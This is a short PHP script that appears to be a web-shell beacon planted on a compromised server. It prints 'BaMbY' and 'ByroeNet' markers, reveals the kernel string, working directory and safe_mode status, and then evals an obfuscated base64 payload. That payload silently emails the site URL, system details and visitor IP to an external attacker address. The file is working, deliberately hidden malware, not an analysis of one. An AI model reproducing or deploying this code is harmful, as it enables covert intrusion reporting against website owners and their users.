<?
$win = strtolower(substr(PHP_OS,0,3)) == "win";
echo "B"."a"."M"."b"."Y"."<br>";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "[SAFEMOD:".$hsafemode."] [Kernel:".$xos."]";
echo "<center><A class=ria href=\"http://".$OS."\">";echo "B"."a"."M"."b"."Y</A></center><br>";
echo "<br>OSTYPE:$OS<br>";
echo "<br>Pwd:$xpwd<br>";
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJaV1IzYVhOQWJHbDJaUzVqYjIwPSIpOyAoJHNhZmVfbW9kZSk/KCRzYWZlbW9kZT0iT04iKTooJHNhZmVtb2RlPSJPRkYiKTsgJGJhc2U9Imh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsgICRuYW1lID0gcGhwX3VuYW1lKCk7ICRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsgJGhvc3QgPSBnZXRob3N0YnlhZGRyKCRfU0VSVkVSW1JFTU9URV9BRERSXSk7ICRzdWJqID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyAgJG1zZyA9ICJcbkJBU0U6ICRiYXNlXG51bmFtZSAtYTogJG5hbWVcbklQOiAkaXBcbkhvc3Q6ICRob3N0XG4kcHdkc1xuIjsgJGZyb20gPSJGcm9tOiBNT0RFXz0iLiRzYWZlbW9kZS4iPHRvb2xAIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIj4iOyBtYWlsKCAkY3JlYXRvciwgJHN1YmosICRtc2csICRmcm9tKTs="));
die("<center> ByroeNet </center>");
?>

